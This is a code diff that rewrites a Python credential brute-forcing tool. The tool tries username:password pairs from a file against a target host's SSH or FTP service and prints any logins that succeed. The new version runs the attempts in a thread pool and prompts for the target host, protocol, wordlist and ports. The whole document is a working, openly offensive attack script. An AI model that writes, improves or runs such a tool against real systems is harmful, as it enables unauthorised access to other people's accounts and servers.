@@ -1,89 +1,80 @@
-import paramiko
-from ftplib import FTP
-import sys
 import os
-import termcolor
+import sys
 import threading
+import paramiko
+import ftplib
+from getpass import getpass
+from termcolor import colored
 import time
+from concurrent.futures import ThreadPoolExecutor
 
-def bruteforce_ssh_and_ftp(host, protocol, credentials_file, ports=None):
-    stop_flag = 0
-    lock = threading.Lock()
-    threads = []
-
-    def ssh_connect(username, password, port):
-        nonlocal stop_flag
+def ssh_bruteforce(host, port, username, password):
+    try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        try:
-            ssh.connect(host, port=port, username=username, password=password)
-            with lock:
-                stop_flag = 1
-            print(termcolor.colored(
-                f'[+] Found SSH Password: {password}, For Account: {username}, Port: {port}', 'green'))
-        except paramiko.AuthenticationException:
-            print(termcolor.colored(
-                f'[-] Incorrect SSH Login: {username}:{password}, Port: {port}', 'red'))
-        except Exception as e:
-            print(termcolor.colored(f'[-] SSH Error: {str(e)}, Port: {port}', 'red'))
-        finally:
-            ssh.close()
+        ssh.connect(host, port, username, password)
+        print(f'[*] Username: {username}, Password: {password} on {host}:{port}')
+        ssh.close()
+        return True
+    except paramiko.AuthenticationException:
+        pass
+    except paramiko.SSHException as e:
+        print(f'[-] Error connecting to {host}:{port}: {e}')
+    return False
 
-    def ftp_bruteforce(username, password, port):
-        nonlocal stop_flag
-        try:
-            ftp = FTP()
-            ftp.connect(host, port=port)
-            ftp.login(username, password)
-            with lock:
-                stop_flag = 1
-            print(termcolor.colored(
-                f'[+] Found FTP Password: {password}, For Account: {username}, Port: {port}', 'green'))
-        except Exception as e:
-            print(termcolor.colored(f'[-] FTP Error: {str(e)}, Port: {port}', 'red'))
-        finally:
-            try:
-                ftp.quit()
-            except:
-                pass
+def ftp_bruteforce(host, port, username, password):
+    try:
+        ftp = ftplib.FTP()
+        ftp.connect(host, port)
+        ftp.login(user=username, passwd=password)
+        print(f'[*] Username: {username}, Password: {password} on {host}:{port}')
+        ftp.quit()
+        return True
+    except ftplib.error_perm as e:
+        pass
+    except Exception as e:
+        print(f'[-] Error connecting to {host}:{port}: {e}')
+    return False
+
+def bruteforce_ssh_and_ftp(host, protocol, credentials_file, ports=None):
+    print(f'* * * Starting Threaded {protocol} Bruteforce On {host} * * *')
 
     if ports is None:
-        # Default ports for SSH and FTP
         if protocol.lower() == 'ssh':
             ports = [22, 23]
         elif protocol.lower() == 'ftp':
             ports = [21]
 
-    if os.path.exists(credentials_file) == False:
+    if not os.path.exists(credentials_file):
         print('[!!] That File/Path Does Not Exist')
         sys.exit(1)
 
-    print(f'* * * Starting Threaded {protocol} Bruteforce On {host} * * *')
+    with ThreadPoolExecutor(max_workers=10) as executor:
+        for port in ports:
+            with open(credentials_file, 'r') as file:
+                for line in file.readlines():
+                    credentials = line.strip().split(':')
+                    if len(credentials) == 2:
+                        username, password = credentials
+                        if protocol.lower() == 'ssh':
+                            executor.submit(ssh_bruteforce, host, port, username, password)
+                        elif protocol.lower() == 'ftp':
+                            executor.submit(ftp_bruteforce, host, port, username, password)
+                        else:
+                            print(f'[-] Unknown protocol: {protocol}')
+                            sys.exit(1)
 
-    for port in ports:
-        threads = []
-        with open(credentials_file, 'r') as file:
-            for line in file.readlines():
-                with lock:
-                    if stop_flag == 1:
-                        break
-                credentials = line.strip().split(':')
-                if len(credentials) == 2:
-                    username, password = credentials
-                    if protocol.lower() == 'ssh':
-                        t = threading.Thread(target=ssh_connect, args=(username, password, port))
-                    elif protocol.lower() == 'ftp':
-                        t = threading.Thread(target=ftp_bruteforce, args=(username, password, port))
-                    else:
-                        print(f'[-] Unknown protocol: {protocol}')
-                        sys.exit(1)
-                    threads.append(t)
-                    t.start()
-                    time.sleep(1)
+if __name__ == "__main__":
+    host = input("Enter the host IP address: ")
+    protocol = input("Enter the protocol (ssh or ftp): ")
+    credentials_file = input("Enter the path to the credentials file: ")
+    ports = input("Enter the ports (comma-separated, leave blank for default): ")
 
-        # Wait for all threads to complete for this port
-        for t in threads:
-            t.join()
+    if ports:
+        try:
+            ports = list(map(int, ports.split(',')))
+        except ValueError:
+            print("Invalid ports input. Please enter comma-separated integers.")
+            sys.exit(1)
 
-    if stop_flag == 1:
-        exit()
+    bruteforce_ssh_and_ftp(host, protocol, credentials_file, ports)
